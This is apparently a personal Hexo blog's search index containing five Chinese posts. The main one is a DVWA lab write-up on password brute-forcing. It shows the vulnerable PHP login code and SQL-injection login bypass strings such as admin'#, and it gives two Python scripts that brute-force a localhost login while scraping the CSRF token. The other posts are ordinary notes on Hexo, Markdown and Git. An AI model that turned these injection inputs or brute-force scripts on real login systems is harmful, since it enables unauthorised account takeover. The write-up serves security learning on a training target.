<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA之暴力破解]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FDVWA%2F%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2Fdvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.html</url>
    <content type="text"><![CDATA[DVWA之暴力破解 针对DVWA里的暴力破解漏洞进行实验测试。主要内容包括BurpSuite的一些Intruder模块的基本使用和简单的python脚本编写。 简介搞Web安全和渗透的，估计都玩过Dvwa这个靶机。所以关于Dvwa就不说了。直接进入主题吧 Brute Force,即暴力(破解),是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击 话不多说，下面就针对Dvwa中暴力破解模块的不同级别进行分析测试吧。 Low级别先来看源码1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，对于登录的处理，服务器只是验证参数Login是否被设置，并没有任何的防爆破机制。因此可以通过BurpSuite进行爆破。if( isset( $_GET[ &#39;Login&#39; ] ) ) 此外对参数username、password等也没做任何过滤处理。因此此处还存在SQL注入漏洞，可以使用万能密码绕过，在用户名处输入admin&#39;#或者admin&#39; or &#39;1&#39;=&#39;1即可登录。 使用Burp进行爆破 打开Burp，记得设置浏览器代理。 进行抓包浏览器设置好代理后，点击Login按钮，可以看到Burp成功抓包 抓到包后，按ctrl+l键，或者右键选择send to Intruder 因为是要对password参数进行爆破，所以只在password参数内容两边加$ 设置好要爆破的参数后，选择Payloads模块设置字典。可以使用Burp自带的简单字典，或者自己去网上下载构造。因为此处Burp自带的字典里没有password(正确密码)，故我们手动加入进去 设置攻击字典后，设置爆破线程暴力破解是一个穷举的过程，速度很慢，故可以通过多线程加快速度。但Burp社区版不提供增加线程功能，我用的是Burp pro破解版将线程设为50个，然后点击start attack开始爆破 上一步点击开始爆破后，会切换到一个爆破任务详情新窗口在分析爆破结果前，先讲一下原理(感觉太啰嗦了，麻烦且累以后还是不写这么详细好了)我们分别通过万能密码和错误的密码成功登陆和失败登陆，如下两图可以看到，返回的信息是不同的，所以响应包的长度Length也不一样 因此，在爆破任务详情窗口可以通过Length进行筛选选出Length “与众不同”的payload即为密码 Medium级别贴上源码1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( 2 ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; ?&gt; 可以看到，相比low级别的代码，这里主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号进行转义，基本上能抵御SQL注入攻击。但对登录并没做什么防护，因此跟Low级别一样，使用Burp进行爆破即可。 High级别贴上源码1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $pass = md5( $pass ); // Check database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row["avatar"]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; ###分析High级别的代码加入了随机token，可以抵御CSRF攻击，但同时增加了爆破的难度。虽然不能用Burp爆破，但可以用python jio脚本呀先抓一下包分析一下请求可以看到，每次服务器返回的登录页面都会生成一个随机的user_token,用户每次登陆时都要将user_token一起提交，服务器每次收到请求后，也都会先做token的检查，再进行sql查询 脚本编写思路每次用python登录之前，先用python访问登录页面通过BeautifulSoup将user_token抓取出来。抓出来之后拼接url进行登录。我写了两个脚本，原理都差不多，不过是第二个用了requests库中的Session方法。 实现好了，不多bb，开始写吧 先贴代码1234567891011121314151617181920212223242526272829303132333435363738394041#Version:python3#coding=utf-8#Author:Miracle778from bs4 import BeautifulSoupimport urllib3import requestsheader = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;requrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl,header): req = requests.get(url=requrl,headers=header) response = req.text soup = BeautifulSoup(response,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_token#爆10次i = 0user_token= get_token(requrl,header)for line in open("passwd.txt"): url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token i = i+1 req = requests.get(url,headers=header) status_code = req.status_code length = len(req.text) print(i,'admin',line.strip(),status_code,length) user_token = get_token(requrl,header) if i==10: break 12345678910111213141516171819202122232425262728293031323334#Version:python3#coding=utf-8#Author:Miracle778import requestsfrom bs4 import BeautifulSoups = requests.Session()header = &#123; 'Host':'127.0.0.1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Referer':'http://127.0.0.1/vulnerabilities/brute/', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.9', 'Cookie':'Pycharm-ae03759a=6fdf0374-3228-456b-ae40-07e2c178708e;PHPSESSID=3b23u5l2qlg5nmedn4ebrltbg6;security=high', 'Connection':'close'&#125;s.headers = headerrequrl = 'http://127.0.0.1/vulnerabilities/brute/'def get_token(requrl): req = s.get(requrl) soup = BeautifulSoup(req.text,'html.parser') user_token = soup.form.find_all(name='input')[-1]['value'] return user_tokenfor line in open("passwd.txt"): user_token = get_token(requrl) url = requrl + '?username=admin&amp;password=' + line.strip() \ + '&amp;Login=Login&amp;user_token=' + user_token reponse = s.get(url) status_code = reponse.status_code length = len(reponse.text) print('admin',line.strip(),status_code,length) 编写中注意的点先用浏览器F12一下，找出user_token所在标签理清结构后使用BeautifulSoup进行提取(可以用一些爬虫插件、或者直接用python解释器测试)得到BeautifulSoup提取语句：user_token = soup.form.find_all(name=&#39;input&#39;)[-1][&#39;value&#39;] 设置header要注意，不然脚本无效因为这个实验测试是之前做的，写文章的时候复现时发现，header不对的话脚本无效说一下设置header的方法吧。 用Burp抓一下包,然后照着结果设置header。此处应有个笑哭的emoji 效果 Impossible级别这个不怎么好写，就不写了 总结想起之前看别人博客学习的时候，别人写的太简洁了而自己知识面不够广，导致自己学习的时候一脸懵。那种自闭的感觉很容易消磨学习的兴趣。所以自己刚开始写Blog，就总想着写得详细。但写得详细的话，太费时间了。所以之后看情况写吧，一些太啰嗦的东西就懒得贴上来了。]]></content>
      <categories>
        <category>Web安全</category>
        <category>DVWA</category>
        <category>暴力破解</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>burpsuite</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo中插入pdf解决方法]]></title>
    <url>%2Fpdf-test%2Fpdf-test.html</url>
    <content type="text"><![CDATA[解决hexo文章插入pdf的问题 搭好hexo博客后，想着把之前上课的实验弄上去，博客放实验报告，github放代码。互为参考。但word转成md文件太过麻烦。于是就想着直接把pdf放上来,网上搜一圈，发现都是说装一个叫 “hexo-pdf”的插件就行了。不知道是不是插件过时了还是我哪里出了问题，反正我用的时候pdf就死活出不来，于是自己瞎鸡儿琢磨了一个简单粗暴的方法，记录一下。 首先修改_config.yml文件将_config.yml中的post_asset_folder选项置为truepost_asset_folder: true 关于这个选项的功能说明如下: 当您设置post_asset_folder为true参数后，在建立文件时，Hexo 会自动建立一个与文章同名的文件夹，您可以把与该文章相关的所有资源都放到那个文件夹，如此一来，您便可以更方便的使用资源。 然后新建一篇文章$ hexo new &lt;article name&gt; 由于上一步已经将post_asset_folder选项设为了true所以这一步新建文章时会创建一个md文件和一个同名的文件夹为了方便叙述，我用test作为文件和文件夹名 编辑test&#x2E;md 用vim或者别的编辑器打开test&#x2E;mdtest&#x2E;md文件中加入如下代码&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;关于这句代码简单的解释data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹type和width就不说了，这里注意height不能设成100%，不然太矮了，显示效果不好可以用浏览器预览，通过F12预估一下高度。我最后代码如下，供参考&lt;object data=&quot;./test/test.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;877px&quot;&gt; 这里不一定非用object标签，embed、iframe标签也一样具体参考:网页链接 效果此处上传一个测试pdf 总结今天刚看完markdown语法，难免想多写几篇blog练一练。其实今天发文章插图片的时候，插了好久才成功，不知道是什么原因，搞了好久。最后仔细看了看Git执行 $ hexo g输出信息中的生成的图片路径才有点眉目。直接打开hexo-asset-image插件的源码(在node_modules目录下)，原来是hexo-asset-image这个插件对图片路径名的处理函数跟我的输入路径对不上。所以会把我的图片路径转换错，所以一直访问不到。虽然js代码不会写，改不了插件源码，但我会看呀，把自己的图片路径输入格式按照它处理的那样输，最后成功解决。本来想记录一下再水一篇blog的，但后面懒的记了另外如果pdf插不成功的话，记得看一下$ hexo g的输出信息有没有生成pdf静态文件，然后检查检查路径 解决了pdf嵌入问题的话 那过几天就可以把我之前的实验报告弄上去了还记得上学期用pyqt做的端口扫描器跟注册表编辑器还有一些python网络编程写的辣鸡聊天室、辣鸡异步服务器等等还有密码学几个MFC写的辣鸡算法(不知道多久的以后应该会用python、Go重构一下)还有这学期会做几个信息隐藏的算法，辣鸡图片隐写术可能也会来瞎研究的一些Web安全、渗透方面的东西估计也会写一写 ···一大波辣鸡代码正在路上···]]></content>
      <categories>
        <category>pdf-test</category>
      </categories>
      <tags>
        <tag>hexo 插入pdf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown-study]]></title>
    <url>%2FStudy%2Fmarkdown%2Fmarkdown-study.html</url>
    <content type="text"><![CDATA[在Hexo上写文章肯定要回markdown，于是对着官方文档过了一遍，用的是VS code加Markdown Preview Enhanced插件，源码会放在最后。 中文文档地址 : https://markdown-zh.readthedocs.io/en/latest/ 标题现在听的歌王菲 - 我也不想这样段落This is a regular paragraph html里块级跟非块级标签不同用法,块级标签里面不能用md语法 Foo bar #块级元素里用md语法 无效 This is another regular paragraph html跟md语法的一些比较加粗体**text** 将text加粗，与&lt;b&gt;标签相似 加斜体span用处，组合行内元素，添加id class等属性 *text* md语法，表示斜体,与&lt;cite&gt;和&lt;em&gt;标签类似cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置 加删除线表示删除文本，html del标签md语法里用两条波浪线~表示 行尾加两个空格以上回车表示换行 标题两种表示方法第一种=、-文本下面加=表示一级标题，下面加-表示二级标题 第二种##的数量代表级数## 二级### 三级#### 四级 块级元素块引用 块引用，通过 >text声明 这是第一层 这是第二层 回到第一层 可以嵌套md语法 列表1 列表2 列表3 列表 无序列表 可用*、+、- 有序列表 使用数字加点如:1. Bird Magic 注释块 A list item with a blockquote: This is a blockquoteinside a list item. 代码块 A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) 水平线用三个连着的字符(字符中间有空格不要紧，-，*，_) 内联元素内联链接中括号加括号[]()如:[miracle778’s Blog](https://miracle778.github.io) 显示如下miracle778’s Blog 引用链接两个中括号[ ][ ]This is [an example] [id] reference-style link.[id]: http://example.com/ “鼠标悬浮在id上显示的文字” 默认链接google 强调上面比较html跟md的时候有提到用单*或单_表示斜体，与&lt;em&gt;标签类似用双*或双_表示粗体,与&lt;strong&gt;标签类似 代码用 单`或三`，三`可以指定代码语言,如下1echo "hello bash"; 1echo "hello php"; 图片内联图片语法:![文件名](路径 “可选项:表示鼠标悬停显示信息”)如: 引用图片语法:![文件名][id] 其他自动链接语法:&lt;url&gt;http://miracle778.github.com 反斜杠转义常识，不写了 代码#标题 ## 现在听的歌 ### 王菲 - 我也不想这样 # 段落 This is a regular paragraph ## html里块级跟非块级标签不同用法,块级标签里面不能用md语法 &lt;table&gt; &lt;tr&gt; &lt;td&gt;Foo&lt;/td&gt; &lt;td&gt;bar&lt;/td&gt; &lt;td&gt;#块级元素里用md语法 无效&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; This is another regular paragraph &lt;br /&gt;&lt;br /&gt; ## html跟md语法的一些比较 ### 加粗体 \*\*text** 将text加粗，与&amp;lt;b&gt;标签相似 ### 加斜体 &lt;span id=&quot;span&quot;&gt;span用处，组合行内元素，添加id class等属性&lt;/span&gt; &lt;br/&gt; \*text\* md语法，表示斜体,与&amp;lt;cite&amp;gt;和&amp;lt;em&gt;标签类似&lt;br/&gt; &lt;cite&gt; &lt;a&gt;cite标签表示对文献的引用，为斜体一般和a标签一起用，链接到所参考位置&lt;/a&gt; &lt;/cite&gt; ### 加删除线 &lt;del&gt;表示删除文本，html del标签&lt;/del&gt; ~~md语法里用两条波浪线\~表示~~ **行尾加两个空格以上回车表示换行** # 标题两种表示方法 *第一种=、-* 文本下面加=表示一级标题，下面加-表示二级标题 一级标题 ========== 二级标题 --------- *第二种#* \#的数量代表级数 ## 二级 ### 三级 #### 四级 # 块级元素 ## 块引用 &gt; 块引用，通过 \&gt;text声明 &gt; &gt; &gt; 这是第一层 &gt; &gt; &gt; &gt; 这是第二层 &gt; &gt; &gt; **回到第一层** &gt; # 可以嵌套md语法 &gt; 1. 列表1 &gt; 2. 列表2 &gt; 3. 列表3 ## 列表 - 无序列表 + 可用*、+、- * 有序列表 + 使用数字加点1. 1. Bird 2. Magic ## 注释块 * A list item with a blockquote: &gt; This is a blockquote &gt; inside a list item. ## 代码块 * A list item with a codeblock: def func(): print(&quot;hello Python!&quot;) ## 水平线 用三个连着的字符(字符中间有空格不要紧，-，*，_) - - - _ _ ___ * * * # 内联元素 ## 内联链接 **中括号加括号\[]()** 如:\[miracle778&apos;s Blog](https://miracle778.github.io) 显示如下 [miracle778&apos;s Blog](https://miracle778.github.io) ## 引用链接 **两个中括号[ ][ ]** This is [an example] [id] reference-style link. &lt;!-- 引用链接时，声明需隔开一行 --&gt; [id]: http://example.com/ &quot;鼠标悬浮在id上显示的文字&quot; ## 默认链接 [google][] [google]:http://google.com ## 强调 **上面比较html跟md的时候有提到** 用单\*或单\_表示斜体，与&amp;lt;em&gt;标签类似 用双\*或双\_表示粗体,与&amp;lt;strong&gt;标签类似 ## 代码 用 单\`或三\`，三`可以指定代码语言,如下 1echo "hello bash"; 1echo "hello php"; ## 图片 ### 内联图片 语法:!\[文件名](路径 &quot;可选项:表示鼠标悬停显示信息&quot;)如: ![米兔](../images/markdown-study/米兔.jpg &quot;米兔&quot;) ### 引用图片 语法:!\[文件名]\[id] ![米兔][miracle] [miracle]: ../images/markdown-study/米兔.jpg &quot;可选项:鼠标悬停显示信息&quot; # 其他 ## 自动链接 语法:&amp;lt;url&amp;gt; &lt;http://miracle778.github.com&gt; ## 反斜杠转义 **常识，不写了** 总结markdown还是容易学的，几个小时就能搞懂。但在把文章部署到hexo上时，出现了点问题。原因是VScode的Markdown Preview Enhanced插件预览的效果跟实际发布的效果有点不同。vscode里加div这种标签预览可以正常显示，而发布后不能，搞得我微调了好久，还有就是引用资源的路径，插入图片需要配置一下。还好，都是一些小问题，以后多写写，养成习惯就好。]]></content>
      <categories>
        <category>Study</category>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>study note</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2Fhello%2Fhello-world.html</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github入门与实践学习笔记]]></title>
    <url>%2FStudy%2Fgit%2Fgit-study.html</url>
    <content type="text"><![CDATA[这篇学习笔记是之前发在wordpress上的，现在迁移过来了。介绍了一些git的使用，其实写的很辣鸡，但毕竟当初也是认真写的，所以直接迁过来了。 学习github，找了本书《github入门与实践》，想着做点笔记。这本书目前看着还是很舒服的，把命令记一记，先贴个书的pdf链接 https://pan.baidu.com/s/1oayFJbXvu2ZhoGmCtn82wg 密码：baua 只是自己的笔记，写的时候可能只顾让自己看懂，如果别人也在学这本书的话，可以看看2333 第一章介绍了下github是什么，git与github的区别，没什么写的。 第二章讲了安装git，按照书上写的安装完git后，然后初始化git，设置一下使用git时的姓名和邮件地址，名字注意用英文输入 $git config –global user.name “Firstname Lastname”//你的用户名$git config –global user.email “your_email@example.com“//你的邮件地址$git config –global color.ui auto$git config –global core.autocrlf false 设置完之后用cat ~/.gitconfig查看，书上是写~/.gitconfig ，但是由于查看时.gitconfig不是可执行文件，所以要改成cat ~/.gitconfig 第三章第三章名字叫使用github的前期准备，所以就是一些准备工作 创建github账户，浏览器打开http://github.com/join 填写完自己的信息之后完成创建，创建完之后按照他的guide，新建hello-world项目。 设置SSH Key $ssh-keygen -t rsa -C “your_email@example.com“输入完命令之后可以在本地文件夹找到私钥：id_rsa和公钥id_rsa.pub 添加公开密钥：按照书上添加即可 用私钥连接github $ssh -T git@github.com 公开代码 clone已有仓库 $git clone git@github.com:xxxx/xxxx.git //仓库路径去github上找 克隆下来之后就可以在本地文件夹中找到以克隆仓库为名的文件夹，在这个文件夹中可以放入想要同步到github上的文件，比如写一个hello_world.php文件放入 用命令$git status查看刚刚放入的文件，由于hello-world.php文件还没有添加至git仓库，所以显示为Untracked files 将hello-world.php文件提交至仓库 $git add hello-world.php //git add命令将文件加入暂存区(缓存区) $git commit -m “Add hello world script by php” //git commit命令将文件提交到本地仓库 $git push //git push命令将本地参库修改同步至服务器仓库 $git log //git log命令查看提交日志 先写这么一点开个头，待更…2018/03/15 21:00更 第四章通过实际操作学习Git，这章主要讲Git一些常用操作，基本熟练了这一章的话，日常使用GitHub应该没问题，我也打算先学到这里，先把github作为一个仓库使使，日后按需学习2333… $git init—初始化仓库 直接上命令吧，详细的解释实在不记得可以翻书嘛1.先在本地建立一个目录作为仓库并初始化$mkdir d:/Github/git-tutorial //mkdir是linux命令，建立文件夹，因为书上用的是Git bash(linux环境)$cd git-tutorial //cd 命令切换目录，cd或cd ~是切换到主目录（home），cd ..是返回上一级，cd ../..是返回上两级，cd 指定路径$git init //进入到git-tutorial目录后，执行git init对仓库初始化，生成.git目录， .git 目录里存储着管理当前目录内容所需的仓库数据到这就初始化成功了，提示：如果再按着书操作的时候某一步操作错了不知道怎么修改的话，可以切换到git-tutorial的上一级目录，然后执行$rm -rf git-tutorial删除这个目录重新来过（为了更快熟悉这些指令(其实是自己输命令测试),我删了好几次…） $touch README.md //创建README.md文件 $vim README.md //用vim编辑README.md(vim是真的好用), vim打开后按i进入插入模式编辑，添加内容后按esc退出编辑模 式，输入:wq保存并退出 $git status //显示仓库的状态 $git add README.md //README.md编辑好之后，$git add README.md将它添加至暂存区（暂存区的文件才可以提交） $git commit -m “First commit” //git commit命令可以将当前暂存区中的文件实际保存到仓库的历史记录中。通过这些记录，我们就可以在工作树中复原文件，-m 参数后的 “First commit”称作提交信息，是对这个提交的概述，如果想详细描述的话用$git commit命令 $git log //通过$git commit提交之后，可以通过git log命令查看提交记录及该记录的其他信息，如这个命令的哈希值 $git diff 和$git diff HEAD //git diff是查看当前工作树与暂存区的差别，git diff HEAD是查看工作树与最新提交的区别 $git branch//查看当前所在分支 $git branch feature-A//建立一个新分支 $git checkout feature-A//切换到指定分支 $git checkout -b feature-A//创建一个新分支并切换到 feature-A 分支的更改不会影响到master 分支，这正是在开发中创建分支的优点。只要创建多个分支，就可以在不互相影响的情况下同时进行多个功能的开发。 $git merge –no-ff feature-A//合并分支，千万注意先切换回master分支再进行合并，为了在历史记录中明确记录下本次分支合并，我们需要创建合并提交。因此，在合并时加上 –no-ff参数 $git log –graph //git log –graph命令可以用图表形式输出提交日志，非常直观 $git reset –hard 哈希值（通过git log查看）// git reset——回溯历史版本，所有文件都回溯到了指定哈希值对应的时间点上。也要注意在master分支下操作 $git reflog //git log命令只能查看以当前状态为终点的历史日志。所以这里要使用 git reflog命令，查看当前仓库的操作日志。在日志中找出回溯历史之前的哈希值，通过 git reset –hard命令恢复到回溯历史前的状态。 $ git commit – amend——修改提交信息，提交日志中的相应内容也会被修改。 $git rebase -i //在合并特性分支之前，如果发现已提交的内容中有些许拼写错误等，不妨提交一个修改，然后将这个修改包含到前一个提交之中，压缩成一个历史记录。 $git rebase -i HEAD~2 //用上述方式执行 git rebase命令，可以选定当前分支中包含HEAD（最新提交）在内的两个最新历史记录为对象，并在编辑器中打开。 用fixup替换pick，可以将提交历史压缩。 在本地仓库操作完之后，接下来就可以推送至远程仓库了。 在Github上新建一个仓库，注意不要选择Initialize this repository with a README （自动生成README.md文件）选项，因为本地仓库自己生成了。然后上命令 $git remote add origin git@github.com:你的用户名/git-tutorial.git //在 GitHub 上创建的仓库路径为“git@github.com:用户名 /git-tutorial.git”。现在我们用 git remote add命令将它设置成本地仓库的远程仓库。按照上述格式执行 git remote add命令之后，Git 会自动将git@github.com:用户名/git-tutorial.git远程仓库的名称设置为 origin（标识符）。 $git remote remove origin //移除与远程仓库的关联 $git push -u origin master //在master分支进行该操作，像这样执行 git push命令，当前分支的内容就会被推送给远程仓库origin 的 master分支。-u参数可以在推送的同时，将origin仓库的master分支设置为本地仓库当前分支的 upstream（上游）。添加了这个参数，将来运行 git pull命令从远程仓库获取内容时，本地仓库的这个分支就可以直接从 origin 的 master 分支获取内容，省去了另外添加参数的麻烦（其实这段话只懂个大概2333，所以就照着用就好吧）。执行该操作后，当前本地仓库 master 分支的内容将会被推送到GitHub 的远程仓库中。在 GitHub 上也可以确认远程 master 分支的内容，和本地 master 分支相同。 $ git push -u origin feature-D(其他分支名) //除了 master 分支之外，远程仓库也可以创建其他分支。 从远程仓库获取 上一节中我们把在 GitHub 上新建的仓库设置成了远程仓库，并向这个仓库 push 了 feature-D 分支。现在，所有能够访问这个远程仓库的人都可以获取 feature-D 分支并加以修改。本节中我们从实际开发者的角度出发，在另一个目录下新建一个本地仓库，学习从远程仓库获取内容的相关操作。这就相当于我们刚刚执行过 push 操作的目标仓库又有了另一名新开发者来共同开发。 $ git clone git@github.com:用户名/git-tutorial.git // git clone——获取远程仓库 ，注意不要与之前操作的同名仓库在同一目录下 执行 git clone命令后我们会默认处于 master 分支下，同时系统会自动将 origin 设置成该远程仓库的标识符。也就是说，当前本地仓库的 master 分支与 GitHub 端远程仓库（origin）的 master 分支在内容上是完全相同的。 $git branch -a //用 git branch -a命令查看当前分支的相关信息。添加 -a参数可以同时显示本地仓库和远程仓库的分支信息。 $git checkout -b feature-D origin/feature-D //我们试着将 feature-D 分支获取至本地仓库 b 参数的后面是本地仓库中新建分支的名称。为了便于理解，我们仍将其命名为 feature-D，让它与远程仓库的对应分支保持同名。新建分支名称后面是获取来源的分支名称。例子中指定了 origin/feature-D，就是说以名为 origin 的仓库（这里指 GitHub 端的仓库）的 feature-D 分支为来源，在本地仓库中创建 feature-D 分支。 现在假定我们是另一名开发者，我们可以对feature-D仓库进行修改提交，完善之后通过 $git push将修改同步到Github上去。从远程仓库获取 feature-D 分支，在本地仓库中提交更改，再将feature-D 分支推送回远程仓库，通过这一系列操作，就可以与其他开发者相互合作，共同培育 feature-D 分支，实现某些功能。 $ git pull origin feature-D //获取最新的远程仓库分支 GitHub 端远程仓库中的 feature-D 分支是最新状态，如果本地仓库没有更新的话，可以通过git pull origin feature-D更新。今后只需要像平常一样在本地进行提交再 push 给远程仓库，就可以与其他开发者同时在同一个分支中进行作业，不断给 feature-D 增加新功能。如果两人同时修改了同一部分的源代码，push 时就很容易发生冲突。所以多名开发者在同一个分支中进行作业时，为减少冲突情况的发生，建议更频繁地进行 push 和 pull 操作。 就写到这里把，留个笔记，以后用来查询]]></content>
      <categories>
        <category>Study</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>git learning notes</tag>
      </tags>
  </entry>
</search>
